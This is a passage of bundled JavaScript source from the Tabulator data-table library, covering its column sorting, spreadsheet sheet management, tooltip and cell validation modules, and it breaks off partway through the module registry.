          arrowEl.appendChild(this.table.options.headerSortElement);
          break;
        default:
          arrowEl.innerHTML = this.table.options.headerSortElement;
      }
      column.titleHolderElement.appendChild(arrowEl);
      column.modules.sort.element = arrowEl;
      this.setColumnHeaderSortIcon(column, "none");
      if (this.table.options.headerSortClickElement === "icon") {
        arrowEl.addEventListener("mousedown", (e2) => {
          e2.stopPropagation();
        });
      }
      (this.table.options.headerSortClickElement === "icon" ? arrowEl : colEl).addEventListener("click", (e2) => {
        var dir = "", sorters = [], match2 = false;
        if (column.modules.sort) {
          if (column.modules.sort.tristate) {
            if (column.modules.sort.dir == "none") {
              dir = column.modules.sort.startingDir;
            } else {
              if (column.modules.sort.dir == column.modules.sort.startingDir) {
                dir = column.modules.sort.dir == "asc" ? "desc" : "asc";
              } else {
                dir = "none";
              }
            }
          } else {
            switch (column.modules.sort.dir) {
              case "asc":
                dir = "desc";
                break;
              case "desc":
                dir = "asc";
                break;
              default:
                dir = column.modules.sort.startingDir;
            }
          }
          if (this.table.options.columnHeaderSortMulti && (e2.shiftKey || e2.ctrlKey)) {
            sorters = this.getSort();
            match2 = sorters.findIndex((sorter2) => {
              return sorter2.field === column.getField();
            });
            if (match2 > -1) {
              sorters[match2].dir = dir;
              match2 = sorters.splice(match2, 1)[0];
              if (dir != "none") {
                sorters.push(match2);
              }
            } else {
              if (dir != "none") {
                sorters.push({ column, dir });
              }
            }
            this.setSort(sorters);
          } else {
            if (dir == "none") {
              this.clear();
            } else {
              this.setSort(column, dir);
            }
          }
          this.refreshSort();
        }
      });
    }
  }
  refreshSort() {
    if (this.table.options.sortMode === "remote") {
      this.reloadData(null, false, false);
    } else {
      this.refreshData(true);
    }
  }
  //check if the sorters have changed since last use
  hasChanged() {
    var changed = this.changed;
    this.changed = false;
    return changed;
  }
  //return current sorters
  getSort() {
    var self = this, sorters = [];
    self.sortList.forEach(function(item) {
      if (item.column) {
        sorters.push({ column: item.column.getComponent(), field: item.column.getField(), dir: item.dir });
      }
    });
    return sorters;
  }
  //change sort list and trigger sort
  setSort(sortList, dir) {
    var self = this, newSortList = [];
    if (!Array.isArray(sortList)) {
      sortList = [{ column: sortList, dir }];
    }
    sortList.forEach(function(item) {
      var column;
      column = self.table.columnManager.findColumn(item.column);
      if (column) {
        item.column = column;
        newSortList.push(item);
        self.changed = true;
      } else {
        console.warn("Sort Warning - Sort field does not exist and is being ignored: ", item.column);
      }
    });
    self.sortList = newSortList;
    this.dispatch("sort-changed");
  }
  //clear sorters
  clear() {
    this.setSort([]);
  }
  //find appropriate sorter for column
  findSorter(column) {
    var row = this.table.rowManager.activeRows[0], sorter = "string", field, value;
    if (row) {
      row = row.getData();
      field = column.getField();
      if (field) {
        value = column.getFieldValue(row);
        switch (typeof value) {
          case "undefined":
            sorter = "string";
            break;
          case "boolean":
            sorter = "boolean";
            break;
          default:
            if (!isNaN(value) && value !== "") {
              sorter = "number";
            } else {
              if (value.match(/((^[0-9]+[a-z]+)|(^[a-z]+[0-9]+))+$/i)) {
                sorter = "alphanum";
              }
            }
            break;
        }
      }
    }
    return Sort.sorters[sorter];
  }
  //work through sort list sorting data
  sort(data, sortOnly) {
    var self = this, sortList = this.table.options.sortOrderReverse ? self.sortList.slice().reverse() : self.sortList, sortListActual = [], rowComponents = [];
    if (this.subscribedExternal("dataSorting")) {
      this.dispatchExternal("dataSorting", self.getSort());
    }
    if (!sortOnly) {
      self.clearColumnHeaders();
    }
    if (this.table.options.sortMode !== "remote") {
      sortList.forEach(function(item, i2) {
        var sortObj;
        if (item.column) {
          sortObj = item.column.modules.sort;
          if (sortObj) {
            if (!sortObj.sorter) {
              sortObj.sorter = self.findSorter(item.column);
            }
            item.params = typeof sortObj.params === "function" ? sortObj.params(item.column.getComponent(), item.dir) : sortObj.params;
            sortListActual.push(item);
          }
          if (!sortOnly) {
            self.setColumnHeader(item.column, item.dir);
          }
        }
      });
      if (sortListActual.length) {
        self._sortItems(data, sortListActual);
      }
    } else if (!sortOnly) {
      sortList.forEach(function(item, i2) {
        self.setColumnHeader(item.column, item.dir);
      });
    }
    if (this.subscribedExternal("dataSorted")) {
      data.forEach((row) => {
        rowComponents.push(row.getComponent());
      });
      this.dispatchExternal("dataSorted", self.getSort(), rowComponents);
    }
    return data;
  }
  //clear sort arrows on columns
  clearColumnHeaders() {
    this.table.columnManager.getRealColumns().forEach((column) => {
      if (column.modules.sort) {
        column.modules.sort.dir = "none";
        column.getElement().setAttribute("aria-sort", "none");
        this.setColumnHeaderSortIcon(column, "none");
      }
    });
  }
  //set the column header sort direction
  setColumnHeader(column, dir) {
    column.modules.sort.dir = dir;
    column.getElement().setAttribute("aria-sort", dir === "asc" ? "ascending" : "descending");
    this.setColumnHeaderSortIcon(column, dir);
  }
  setColumnHeaderSortIcon(column, dir) {
    var sortEl = column.modules.sort.element, arrowEl;
    if (column.definition.headerSort && typeof this.table.options.headerSortElement === "function") {
      while (sortEl.firstChild) sortEl.removeChild(sortEl.firstChild);
      arrowEl = this.table.options.headerSortElement.call(this.table, column.getComponent(), dir);
      if (typeof arrowEl === "object") {
        sortEl.appendChild(arrowEl);
      } else {
        sortEl.innerHTML = arrowEl;
      }
    }
  }
  //sort each item in sort list
  _sortItems(data, sortList) {
    var sorterCount = sortList.length - 1;
    data.sort((a, b) => {
      var result;
      for (var i2 = sorterCount; i2 >= 0; i2--) {
        let sortItem = sortList[i2];
        result = this._sortRow(a, b, sortItem.column, sortItem.dir, sortItem.params);
        if (result !== 0) {
          break;
        }
      }
      return result;
    });
  }
  //process individual rows for a sort function on active data
  _sortRow(a, b, column, dir, params) {
    var el1Comp, el2Comp;
    var el1 = dir == "asc" ? a : b;
    var el2 = dir == "asc" ? b : a;
    a = column.getFieldValue(el1.getData());
    b = column.getFieldValue(el2.getData());
    a = typeof a !== "undefined" ? a : "";
    b = typeof b !== "undefined" ? b : "";
    el1Comp = el1.getComponent();
    el2Comp = el2.getComponent();
    return column.modules.sort.sorter.call(this, a, b, el1Comp, el2Comp, column.getComponent(), dir, params);
  }
}
class GridCalculator {
  constructor(columns, rows2) {
    this.columnCount = columns;
    this.rowCount = rows2;
    this.columnString = [];
    this.columns = [];
    this.rows = [];
  }
  genColumns(data) {
    var colCount = Math.max(this.columnCount, Math.max(...data.map((item) => item.length)));
    this.columnString = [];
    this.columns = [];
    for (let i2 = 1; i2 <= colCount; i2++) {
      this.incrementChar(this.columnString.length - 1);
      this.columns.push(this.columnString.join(""));
    }
    return this.columns;
  }
  genRows(data) {
    var rowCount = Math.max(this.rowCount, data.length);
    this.rows = [];
    for (let i2 = 1; i2 <= rowCount; i2++) {
      this.rows.push(i2);
    }
    return this.rows;
  }
  incrementChar(i2) {
    let char = this.columnString[i2];
    if (char) {
      if (char !== "Z") {
        this.columnString[i2] = String.fromCharCode(this.columnString[i2].charCodeAt(0) + 1);
      } else {
        this.columnString[i2] = "A";
        if (i2) {
          this.incrementChar(i2 - 1);
        } else {
          this.columnString.push("A");
        }
      }
    } else {
      this.columnString.push("A");
    }
  }
  setRowCount(count) {
    this.rowCount = count;
  }
  setColumnCount(count) {
    this.columnCount = count;
  }
}
class SheetComponent {
  constructor(sheet) {
    this._sheet = sheet;
    return new Proxy(this, {
      get: function(target, name, receiver) {
        if (typeof target[name] !== "undefined") {
          return target[name];
        } else {
          return target._sheet.table.componentFunctionBinder.handle("sheet", target._sheet, name);
        }
      }
    });
  }
  getTitle() {
    return this._sheet.title;
  }
  getKey() {
    return this._sheet.key;
  }
  getDefinition() {
    return this._sheet.getDefinition();
  }
  getData() {
    return this._sheet.getData();
  }
  setData(data) {
    return this._sheet.setData(data);
  }
  clear() {
    return this._sheet.clear();
  }
  remove() {
    return this._sheet.remove();
  }
  active() {
    return this._sheet.active();
  }
  setTitle(title) {
    return this._sheet.setTitle(title);
  }
  setRows(rows2) {
    return this._sheet.setRows(rows2);
  }
  setColumns(columns) {
    return this._sheet.setColumns(columns);
  }
}
class Sheet extends CoreFeature {
  constructor(spreadsheetManager, definition) {
    super(spreadsheetManager.table);
    this.spreadsheetManager = spreadsheetManager;
    this.definition = definition;
    this.title = this.definition.title || "";
    this.key = this.definition.key || this.definition.title;
    this.rowCount = this.definition.rows;
    this.columnCount = this.definition.columns;
    this.data = this.definition.data || [];
    this.element = null;
    this.isActive = false;
    this.grid = new GridCalculator(this.columnCount, this.rowCount);
    this.defaultColumnDefinition = { width: 100, headerHozAlign: "center", headerSort: false };
    this.columnDefinition = Object.assign(this.defaultColumnDefinition, this.options("spreadsheetColumnDefinition"));
    this.columnDefs = [];
    this.rowDefs = [];
    this.columnFields = [];
    this.columns = [];
    this.rows = [];
    this.scrollTop = null;
    this.scrollLeft = null;
    this.initialize();
    this.dispatchExternal("sheetAdded", this.getComponent());
  }
  ///////////////////////////////////
  ///////// Initialization //////////
  ///////////////////////////////////
  initialize() {
    this.initializeElement();
    this.initializeColumns();
    this.initializeRows();
  }
  reinitialize() {
    this.initializeColumns();
    this.initializeRows();
  }
  initializeElement() {
    this.element = document.createElement("div");
    this.element.classList.add("tabulator-spreadsheet-tab");
    this.element.innerText = this.title;
    this.element.addEventListener("click", () => {
      this.spreadsheetManager.loadSheet(this);
    });
  }
  initializeColumns() {
    this.grid.setColumnCount(this.columnCount);
    this.columnFields = this.grid.genColumns(this.data);
    this.columnDefs = [];
    this.columnFields.forEach((ref) => {
      var def = Object.assign({}, this.columnDefinition);
      def.field = ref;
      def.title = ref;
      this.columnDefs.push(def);
    });
  }
  initializeRows() {
    var refs;
    this.grid.setRowCount(this.rowCount);
    refs = this.grid.genRows(this.data);
    this.rowDefs = [];
    refs.forEach((ref, i2) => {
      var def = { "_id": ref };
      var data = this.data[i2];
      if (data) {
        data.forEach((val, j) => {
          var field = this.columnFields[j];
          if (field) {
            def[field] = val;
          }
        });
      }
      this.rowDefs.push(def);
    });
  }
  unload() {
    this.isActive = false;
    this.scrollTop = this.table.rowManager.scrollTop;
    this.scrollLeft = this.table.rowManager.scrollLeft;
    this.data = this.getData(true);
    this.element.classList.remove("tabulator-spreadsheet-tab-active");
  }
  load() {
    var wasInactive = !this.isActive;
    this.isActive = true;
    this.table.blockRedraw();
    this.table.setData([]);
    this.table.setColumns(this.columnDefs);
    this.table.setData(this.rowDefs);
    this.table.restoreRedraw();
    if (wasInactive && this.scrollTop !== null) {
      this.table.rowManager.element.scrollLeft = this.scrollLeft;
      this.table.rowManager.element.scrollTop = this.scrollTop;
    }
    this.element.classList.add("tabulator-spreadsheet-tab-active");
    this.dispatchExternal("sheetLoaded", this.getComponent());
  }
  ///////////////////////////////////
  //////// Helper Functions /////////
  ///////////////////////////////////
  getComponent() {
    return new SheetComponent(this);
  }
  getDefinition() {
    return {
      title: this.title,
      key: this.key,
      rows: this.rowCount,
      columns: this.columnCount,
      data: this.getData()
    };
  }
  getData(full) {
    var output = [], rowWidths, outputWidth, outputHeight;
    this.rowDefs.forEach((rowData) => {
      var row = [];
      this.columnFields.forEach((field) => {
        row.push(rowData[field]);
      });
      output.push(row);
    });
    if (!full && !this.options("spreadsheetOutputFull")) {
      rowWidths = output.map((row) => row.findLastIndex((val) => typeof val !== "undefined") + 1);
      outputWidth = Math.max(...rowWidths);
      outputHeight = rowWidths.findLastIndex((width) => width > 0) + 1;
      output = output.slice(0, outputHeight);
      output = output.map((row) => row.slice(0, outputWidth));
    }
    return output;
  }
  setData(data) {
    this.data = data;
    this.reinitialize();
    this.dispatchExternal("sheetUpdated", this.getComponent());
    if (this.isActive) {
      this.load();
    }
  }
  clear() {
    this.setData([]);
  }
  setTitle(title) {
    this.title = title;
    this.element.innerText = title;
    this.dispatchExternal("sheetUpdated", this.getComponent());
  }
  setRows(rows2) {
    this.rowCount = rows2;
    this.initializeRows();
    this.dispatchExternal("sheetUpdated", this.getComponent());
    if (this.isActive) {
      this.load();
    }
  }
  setColumns(columns) {
    this.columnCount = columns;
    this.reinitialize();
    this.dispatchExternal("sheetUpdated", this.getComponent());
    if (this.isActive) {
      this.load();
    }
  }
  remove() {
    this.spreadsheetManager.removeSheet(this);
  }
  destroy() {
    if (this.element.parentNode) {
      this.element.parentNode.removeChild(this.element);
    }
    this.dispatchExternal("sheetRemoved", this.getComponent());
  }
  active() {
    this.spreadsheetManager.loadSheet(this);
  }
}
class Spreadsheet extends Module {
  static moduleName = "spreadsheet";
  constructor(table) {
    super(table);
    this.sheets = [];
    this.element = null;
    this.registerTableOption("spreadsheet", false);
    this.registerTableOption("spreadsheetRows", 50);
    this.registerTableOption("spreadsheetColumns", 50);
    this.registerTableOption("spreadsheetColumnDefinition", {});
    this.registerTableOption("spreadsheetOutputFull", false);
    this.registerTableOption("spreadsheetData", false);
    this.registerTableOption("spreadsheetSheets", false);
    this.registerTableOption("spreadsheetSheetTabs", false);
    this.registerTableOption("spreadsheetSheetTabsElement", false);
    this.registerTableFunction("setSheets", this.setSheets.bind(this));
    this.registerTableFunction("addSheet", this.addSheet.bind(this));
    this.registerTableFunction("getSheets", this.getSheets.bind(this));
    this.registerTableFunction("getSheetDefinitions", this.getSheetDefinitions.bind(this));
    this.registerTableFunction("setSheetData", this.setSheetData.bind(this));
    this.registerTableFunction("getSheet", this.getSheet.bind(this));
    this.registerTableFunction("getSheetData", this.getSheetData.bind(this));
    this.registerTableFunction("clearSheet", this.clearSheet.bind(this));
    this.registerTableFunction("removeSheet", this.removeSheetFunc.bind(this));
    this.registerTableFunction("activeSheet", this.activeSheetFunc.bind(this));
  }
  ///////////////////////////////////
  ////// Module Initialization //////
  ///////////////////////////////////
  initialize() {
    if (this.options("spreadsheet")) {
      this.subscribe("table-initialized", this.tableInitialized.bind(this));
      this.subscribe("data-loaded", this.loadRemoteData.bind(this));
      this.table.options.index = "_id";
      if (this.options("spreadsheetData") && this.options("spreadsheetSheets")) {
        console.warn("You cannot use spreadsheetData and spreadsheetSheets at the same time, ignoring spreadsheetData");
        this.table.options.spreadsheetData = false;
      }
      this.compatibilityCheck();
      if (this.options("spreadsheetSheetTabs")) {
        this.initializeTabset();
      }
    }
  }
  compatibilityCheck() {
    if (this.options("data")) {
      console.warn("Do not use the data option when working with spreadsheets, use either spreadsheetData or spreadsheetSheets to pass data into the table");
    }
    if (this.options("pagination")) {
      console.warn("The spreadsheet module is not compatible with the pagination module");
    }
    if (this.options("groupBy")) {
      console.warn("The spreadsheet module is not compatible with the row grouping module");
    }
    if (this.options("responsiveCollapse")) {
      console.warn("The spreadsheet module is not compatible with the responsive collapse module");
    }
  }
  initializeTabset() {
    this.element = document.createElement("div");
    this.element.classList.add("tabulator-spreadsheet-tabs");
    var altContainer = this.options("spreadsheetSheetTabsElement");
    if (altContainer && !(altContainer instanceof HTMLElement)) {
      altContainer = document.querySelector(altContainer);
      if (!altContainer) {
        console.warn("Unable to find element matching spreadsheetSheetTabsElement selector:", this.options("spreadsheetSheetTabsElement"));
      }
    }
    if (altContainer) {
      altContainer.appendChild(this.element);
    } else {
      this.footerAppend(this.element);
    }
  }
  tableInitialized() {
    if (this.sheets.length) {
      this.loadSheet(this.sheets[0]);
    } else {
      if (this.options("spreadsheetSheets")) {
        this.loadSheets(this.options("spreadsheetSheets"));
      } else if (this.options("spreadsheetData")) {
        this.loadData(this.options("spreadsheetData"));
      }
    }
  }
  ///////////////////////////////////
  /////////// Ajax Parsing //////////
  ///////////////////////////////////
  loadRemoteData(data, data1, data2) {
    console.log("data", data, data1, data2);
    if (Array.isArray(data)) {
      this.table.dataLoader.clearAlert();
      this.dispatchExternal("dataLoaded", data);
      if (!data.length || Array.isArray(data[0])) {
        this.loadData(data);
      } else {
        this.loadSheets(data);
      }
    } else {
      console.error("Spreadsheet Loading Error - Unable to process remote data due to invalid data type \nExpecting: array \nReceived: ", typeof data, "\nData:     ", data);
    }
    return false;
  }
  ///////////////////////////////////
  ///////// Sheet Management ////////
  ///////////////////////////////////
  loadData(data) {
    var def = {
      data
    };
    this.loadSheet(this.newSheet(def));
  }
  destroySheets() {
    this.sheets.forEach((sheet) => {
      sheet.destroy();
    });
    this.sheets = [];
    this.activeSheet = null;
  }
  loadSheets(sheets) {
    if (!Array.isArray(sheets)) {
      sheets = [];
    }
    this.destroySheets();
    sheets.forEach((def) => {
      this.newSheet(def);
    });
    this.loadSheet(this.sheets[0]);
  }
  loadSheet(sheet) {
    if (this.activeSheet !== sheet) {
      if (this.activeSheet) {
        this.activeSheet.unload();
      }
      this.activeSheet = sheet;
      sheet.load();
    }
  }
  newSheet(definition = {}) {
    var sheet;
    if (!definition.rows) {
      definition.rows = this.options("spreadsheetRows");
    }
    if (!definition.columns) {
      definition.columns = this.options("spreadsheetColumns");
    }
    sheet = new Sheet(this, definition);
    this.sheets.push(sheet);
    if (this.element) {
      this.element.appendChild(sheet.element);
    }
    return sheet;
  }
  removeSheet(sheet) {
    var index = this.sheets.indexOf(sheet), prevSheet;
    if (this.sheets.length > 1) {
      if (index > -1) {
        this.sheets.splice(index, 1);
        sheet.destroy();
        if (this.activeSheet === sheet) {
          prevSheet = this.sheets[index - 1] || this.sheets[0];
          if (prevSheet) {
            this.loadSheet(prevSheet);
          } else {
            this.activeSheet = null;
          }
        }
      }
    } else {
      console.warn("Unable to remove sheet, at least one sheet must be active");
    }
  }
  lookupSheet(key) {
    if (!key) {
      return this.activeSheet;
    } else if (key instanceof Sheet) {
      return key;
    } else if (key instanceof SheetComponent) {
      return key._sheet;
    } else {
      return this.sheets.find((sheet) => sheet.key === key) || false;
    }
  }
  ///////////////////////////////////
  //////// Public Functions /////////
  ///////////////////////////////////
  setSheets(sheets) {
    this.loadSheets(sheets);
    return this.getSheets();
  }
  addSheet(sheet) {
    return this.newSheet(sheet).getComponent();
  }
  getSheetDefinitions() {
    return this.sheets.map((sheet) => sheet.getDefinition());
  }
  getSheets() {
    return this.sheets.map((sheet) => sheet.getComponent());
  }
  getSheet(key) {
    var sheet = this.lookupSheet(key);
    return sheet ? sheet.getComponent() : false;
  }
  setSheetData(key, data) {
    if (key && !data) {
      data = key;
      key = false;
    }
    var sheet = this.lookupSheet(key);
    return sheet ? sheet.setData(data) : false;
  }
  getSheetData(key) {
    var sheet = this.lookupSheet(key);
    return sheet ? sheet.getData() : false;
  }
  clearSheet(key) {
    var sheet = this.lookupSheet(key);
    return sheet ? sheet.clear() : false;
  }
  removeSheetFunc(key) {
    var sheet = this.lookupSheet(key);
    if (sheet) {
      this.removeSheet(sheet);
    }
  }
  activeSheetFunc(key) {
    var sheet = this.lookupSheet(key);
    return sheet ? this.loadSheet(sheet) : false;
  }
}
class Tooltip extends Module {
  static moduleName = "tooltip";
  constructor(table) {
    super(table);
    this.tooltipSubscriber = null, this.headerSubscriber = null, this.timeout = null;
    this.popupInstance = null;
    this.registerTableOption("tooltipDelay", 300);
    this.registerColumnOption("tooltip");
    this.registerColumnOption("headerTooltip");
  }
  initialize() {
    this.deprecatedOptionsCheck();
    this.subscribe("column-init", this.initializeColumn.bind(this));
  }
  deprecatedOptionsCheck() {
  }
  initializeColumn(column) {
    if (column.definition.headerTooltip && !this.headerSubscriber) {
      this.headerSubscriber = true;
      this.subscribe("column-mousemove", this.mousemoveCheck.bind(this, "headerTooltip"));
      this.subscribe("column-mouseout", this.mouseoutCheck.bind(this, "headerTooltip"));
    }
    if (column.definition.tooltip && !this.tooltipSubscriber) {
      this.tooltipSubscriber = true;
      this.subscribe("cell-mousemove", this.mousemoveCheck.bind(this, "tooltip"));
      this.subscribe("cell-mouseout", this.mouseoutCheck.bind(this, "tooltip"));
    }
  }
  mousemoveCheck(action, e2, component) {
    var tooltip = action === "tooltip" ? component.column.definition.tooltip : component.definition.headerTooltip;
    if (tooltip) {
      this.clearPopup();
      this.timeout = setTimeout(this.loadTooltip.bind(this, e2, component, tooltip), this.table.options.tooltipDelay);
    }
  }
  mouseoutCheck(action, e2, component) {
    if (!this.popupInstance) {
      this.clearPopup();
    }
  }
  clearPopup(action, e2, component) {
    clearTimeout(this.timeout);
    this.timeout = null;
    if (this.popupInstance) {
      this.popupInstance.hide();
    }
  }
  loadTooltip(e2, component, tooltip) {
    var contentsEl, renderedCallback, coords;
    function onRendered(callback) {
      renderedCallback = callback;
    }
    if (typeof tooltip === "function") {
      tooltip = tooltip(e2, component.getComponent(), onRendered);
    }
    if (tooltip instanceof HTMLElement) {
      contentsEl = tooltip;
    } else {
      contentsEl = document.createElement("div");
      if (tooltip === true) {
        if (component instanceof Cell) {
          tooltip = component.value;
        } else {
          if (component.definition.field) {
            this.langBind("columns|" + component.definition.field, (value) => {
              contentsEl.innerHTML = tooltip = value || component.definition.title;
            });
          } else {
            tooltip = component.definition.title;
          }
        }
      }
      contentsEl.innerHTML = tooltip;
    }
    if (tooltip || tooltip === 0 || tooltip === false) {
      contentsEl.classList.add("tabulator-tooltip");
      contentsEl.addEventListener("mousemove", (e3) => e3.preventDefault());
      this.popupInstance = this.popup(contentsEl);
      if (typeof renderedCallback === "function") {
        this.popupInstance.renderCallback(renderedCallback);
      }
      coords = this.popupInstance.containerEventCoords(e2);
      this.popupInstance.show(coords.x + 15, coords.y + 15).hideOnBlur(() => {
        this.dispatchExternal("TooltipClosed", component.getComponent());
        this.popupInstance = null;
      });
      this.dispatchExternal("TooltipOpened", component.getComponent());
    }
  }
}
var defaultValidators = {
  //is integer
  integer: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    value = Number(value);
    return !isNaN(value) && isFinite(value) && Math.floor(value) === value;
  },
  //is float
  float: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    value = Number(value);
    return !isNaN(value) && isFinite(value) && value % 1 !== 0;
  },
  //must be a number
  numeric: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    return !isNaN(value);
  },
  //must be a string
  string: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    return isNaN(value);
  },
  //must be alphanumeric
  alphanumeric: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    var reg = new RegExp(/^[a-z0-9]+$/i);
    return reg.test(value);
  },
  //maximum value
  max: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    return parseFloat(value) <= parameters;
  },
  //minimum value
  min: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    return parseFloat(value) >= parameters;
  },
  //starts with  value
  starts: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    return String(value).toLowerCase().startsWith(String(parameters).toLowerCase());
  },
  //ends with  value
  ends: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    return String(value).toLowerCase().endsWith(String(parameters).toLowerCase());
  },
  //minimum string length
  minLength: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    return String(value).length >= parameters;
  },
  //maximum string length
  maxLength: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    return String(value).length <= parameters;
  },
  //in provided value list
  in: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    if (typeof parameters == "string") {
      parameters = parameters.split("|");
    }
    return parameters.indexOf(value) > -1;
  },
  //must match provided regex
  regex: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    var reg = new RegExp(parameters);
    return reg.test(value);
  },
  //value must be unique in this column
  unique: function(cell, value, parameters) {
    if (value === "" || value === null || typeof value === "undefined") {
      return true;
    }
    var unique = true;
    var cellData = cell.getData();
    var column = cell.getColumn()._getSelf();
    this.table.rowManager.rows.forEach(function(row) {
      var data = row.getData();
      if (data !== cellData) {
        if (value == column.getFieldValue(data)) {
          unique = false;
        }
      }
    });
    return unique;
  },
  //must have a value
  required: function(cell, value, parameters) {
    return value !== "" && value !== null && typeof value !== "undefined";
  }
};
class Validate extends Module {
  static moduleName = "validate";
  //load defaults
  static validators = defaultValidators;
  constructor(table) {
    super(table);
    this.invalidCells = [];
    this.registerTableOption("validationMode", "blocking");
    this.registerColumnOption("validator");
    this.registerTableFunction("getInvalidCells", this.getInvalidCells.bind(this));
    this.registerTableFunction("clearCellValidation", this.userClearCellValidation.bind(this));
    this.registerTableFunction("validate", this.userValidate.bind(this));
    this.registerComponentFunction("cell", "isValid", this.cellIsValid.bind(this));
    this.registerComponentFunction("cell", "clearValidation", this.clearValidation.bind(this));
    this.registerComponentFunction("cell", "validate", this.cellValidate.bind(this));
    this.registerComponentFunction("column", "validate", this.columnValidate.bind(this));
    this.registerComponentFunction("row", "validate", this.rowValidate.bind(this));
  }
  initialize() {
    this.subscribe("cell-delete", this.clearValidation.bind(this));
    this.subscribe("column-layout", this.initializeColumnCheck.bind(this));
    this.subscribe("edit-success", this.editValidate.bind(this));
    this.subscribe("edit-editor-clear", this.editorClear.bind(this));
    this.subscribe("edit-edited-clear", this.editedClear.bind(this));
  }
  ///////////////////////////////////
  ///////// Event Handling //////////
  ///////////////////////////////////
  editValidate(cell, value, previousValue) {
    var valid = this.table.options.validationMode !== "manual" ? this.validate(cell.column.modules.validate, cell, value) : true;
    if (valid !== true) {
      setTimeout(() => {
        cell.getElement().classList.add("tabulator-validation-fail");
        this.dispatchExternal("validationFailed", cell.getComponent(), value, valid);
      });
    }
    return valid;
  }
  editorClear(cell, cancelled) {
    if (cancelled) {
      if (cell.column.modules.validate) {
        this.cellValidate(cell);
      }
    }
    cell.getElement().classList.remove("tabulator-validation-fail");
  }
  editedClear(cell) {
    if (cell.modules.validate) {
      cell.modules.validate.invalid = false;
    }
  }
  ///////////////////////////////////
  ////////// Cell Functions /////////
  ///////////////////////////////////
  cellIsValid(cell) {
    return cell.modules.validate ? cell.modules.validate.invalid || true : true;
  }
  cellValidate(cell) {
    return this.validate(cell.column.modules.validate, cell, cell.getValue());
  }
  ///////////////////////////////////
  ///////// Column Functions ////////
  ///////////////////////////////////
  columnValidate(column) {
    var invalid = [];
    column.cells.forEach((cell) => {
      if (this.cellValidate(cell) !== true) {
        invalid.push(cell.getComponent());
      }
    });
    return invalid.length ? invalid : true;
  }
  ///////////////////////////////////
  ////////// Row Functions //////////
  ///////////////////////////////////
  rowValidate(row) {
    var invalid = [];
    row.cells.forEach((cell) => {
      if (this.cellValidate(cell) !== true) {
        invalid.push(cell.getComponent());
      }
    });
    return invalid.length ? invalid : true;
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  userClearCellValidation(cells) {
    if (!cells) {
      cells = this.getInvalidCells();
    }
    if (!Array.isArray(cells)) {
      cells = [cells];
    }
    cells.forEach((cell) => {
      this.clearValidation(cell._getSelf());
    });
  }
  userValidate(cells) {
    var output = [];
    this.table.rowManager.rows.forEach((row) => {
      row = row.getComponent();
      var valid = row.validate();
      if (valid !== true) {
        output = output.concat(valid);
      }
    });
    return output.length ? output : true;
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  initializeColumnCheck(column) {
    if (typeof column.definition.validator !== "undefined") {
      this.initializeColumn(column);
    }
  }
  //validate
  initializeColumn(column) {
    var self = this, config = [], validator;
    if (column.definition.validator) {
      if (Array.isArray(column.definition.validator)) {
        column.definition.validator.forEach((item) => {
          validator = self._extractValidator(item);
          if (validator) {
            config.push(validator);
          }
        });
      } else {
        validator = this._extractValidator(column.definition.validator);
        if (validator) {
          config.push(validator);
        }
      }
      column.modules.validate = config.length ? config : false;
    }
  }
  _extractValidator(value) {
    var type, params, pos;
    switch (typeof value) {
      case "string":
        pos = value.indexOf(":");
        if (pos > -1) {
          type = value.substring(0, pos);
          params = value.substring(pos + 1);
        } else {
          type = value;
        }
        return this._buildValidator(type, params);
      case "function":
        return this._buildValidator(value);
      case "object":
        return this._buildValidator(value.type, value.parameters);
    }
  }
  _buildValidator(type, params) {
    var func = typeof type == "function" ? type : Validate.validators[type];
    if (!func) {
      console.warn("Validator Setup Error - No matching validator found:", type);
      return false;
    } else {
      return {
        type: typeof type == "function" ? "function" : type,
        func,
        params
      };
    }
  }
  validate(validators, cell, value) {
    var self = this, failedValidators = [], invalidIndex = this.invalidCells.indexOf(cell);
    if (validators) {
      validators.forEach((item) => {
        if (!item.func.call(self, cell.getComponent(), value, item.params)) {
          failedValidators.push({
            type: item.type,
            parameters: item.params
          });
        }
      });
    }
    if (!cell.modules.validate) {
      cell.modules.validate = {};
    }
    if (!failedValidators.length) {
      cell.modules.validate.invalid = false;
      cell.getElement().classList.remove("tabulator-validation-fail");
      if (invalidIndex > -1) {
        this.invalidCells.splice(invalidIndex, 1);
      }
    } else {
      cell.modules.validate.invalid = failedValidators;
      if (this.table.options.validationMode !== "manual") {
        cell.getElement().classList.add("tabulator-validation-fail");
      }
      if (invalidIndex == -1) {
        this.invalidCells.push(cell);
      }
    }
    return failedValidators.length ? failedValidators : true;
  }
  getInvalidCells() {
    var output = [];
    this.invalidCells.forEach((cell) => {
      output.push(cell.getComponent());
    });
    return output;
  }
  clearValidation(cell) {
    var invalidIndex;
    if (cell.modules.validate && cell.modules.validate.invalid) {
      cell.getElement().classList.remove("tabulator-validation-fail");
      cell.modules.validate.invalid = false;
      invalidIndex = this.invalidCells.indexOf(cell);
      if (invalidIndex > -1) {
        this.invalidCells.splice(invalidIndex, 1);
      }
    }
  }
}
var allModules = /* @__PURE__ */ Object.freeze({
  __proto__: null,
  AccessorModule: Accessor,
  AjaxModule: Ajax,
  ClipboardModule: Clipboard,
  ColumnCalcsModule: ColumnCalcs,
  DataTreeModule: DataTree,
  DownloadModule: Download,
  EditModule: Edit2,
  ExportModule: Export,
  FilterModule: Filter,
  FormatModule: Format$1,
